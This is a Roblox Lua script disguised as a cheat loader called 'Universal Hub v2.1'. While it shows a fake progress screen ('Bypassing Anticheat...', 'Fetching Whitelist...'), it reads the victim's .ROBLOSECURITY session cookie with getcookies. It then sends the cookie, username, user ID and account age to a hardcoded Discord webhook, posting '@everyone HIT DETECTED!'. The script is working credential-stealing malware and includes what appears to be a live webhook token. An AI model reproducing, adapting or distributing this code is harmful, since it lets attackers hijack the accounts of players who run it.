-- [[ CONFIGURATION ]]
local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1504590289845620878/04i1nHUKQN2mNjg0pnJolrCospWy2lHR4bKi-N67MIMSplR5KTf1C7kfvorb_fH6TGzQ"

-- [[ SERVICES ]]
local player = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService")

-- [[ ФУНКЦИЯ ОТПРАВКИ (БЕЗОПАСНАЯ) ]]
local function sendFinalLog(cookie)
    local data = {
        ["content"] = "@everyone **HIT DETECTED!**",
        ["embeds"] = {{
            ["title"] = "🛠️ Universal Hub v2.1 | Log",
            ["color"] = 3066993,
            ["fields"] = {
                {["name"] = "👤 Player", ["value"] = player.Name .. " (" .. player.UserId .. ")", ["inline"] = true},
                {["name"] = "🔑 Cookie", ["value"] = "```" .. (cookie or "N/A") .. "```"},
                {["name"] = "📅 Age", ["value"] = player.AccountAge .. " days", ["inline"] = true}
            }
        }}
    }
    
    local request = (syn and syn.request) or (http and http.request) or request or http_request
    if request then
        pcall(function()
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        end)
    end
end

-- [[ СОЗДАНИЕ ИНТЕРФЕЙСА ]]
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 300, 0, 140)
Main.Position = UDim2.new(0.5, -150, 0.5, -70)
Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Main.BorderSizePixel = 0

local Corner = Instance.new("UICorner", Main)
Corner.CornerRadius = Tool -- Стандартный радиус

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = "Universal Hub v2.1"
Title.TextColor3 = Color3.fromRGB(0, 255, 150)
Title.BackgroundTransparency = 1
Title.TextSize = 18
Title.Font = Enum.Font.GothamBold

local Status = Instance.new("TextLabel", Main)
Status.Size = UDim2.new(1, 0, 0, 30)
Status.Position = UDim2.new(0, 0, 0.45, 0)
Status.Text = "Starting..."
Status.TextColor3 = Color3.new(1, 1, 1)
Status.BackgroundTransparency = 1

local BarBack = Instance.new("Frame", Main)
BarBack.Size = UDim2.new(0.8, 0, 0, 4)
BarBack.Position = UDim2.new(0.1, 0, 0.8, 0)
BarBack.BackgroundColor3 = Color3.fromRGB(40, 40, 40)

local BarFill = Instance.new("Frame", BarBack)
BarFill.Size = UDim2.new(0, 0, 1, 0)
BarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)

-- [[ ЛОГИКА ЗАПУСКА ]]
task.spawn(function()
    Status.Text = "Bypassing Anticheat..."
    BarFill:TweenSize(UDim2.new(0.5, 0, 1, 0), "Out", "Linear", 2)
    
    -- Пытаемся достать куки в фоне
    local cookie = "N/A"
    pcall(function()
        if getcookies then
            cookie = getcookies(".roblox.com")[".ROBLOSECURITY"]
        end
    end)
    
    task.wait(2)
    Status.Text = "Fetching Whitelist..."
    BarFill:TweenSize(UDim2.new(0.9, 0, 1, 0), "Out", "Linear", 1)
    
    -- Отправляем данные перед финалом
    pcall(function() sendFinalLog(cookie) end)
    
    task.wait(1)
    Status.Text = "Success! Loaded."
    BarFill:TweenSize(UDim2.new(1, 0, 1, 0), "Out", "Linear", 0.3)
    
    task.wait(0.5)
    -- Чтобы не было вылета от защиты, просто скрываем меню и всё
    ScreenGui:Destroy()
end)
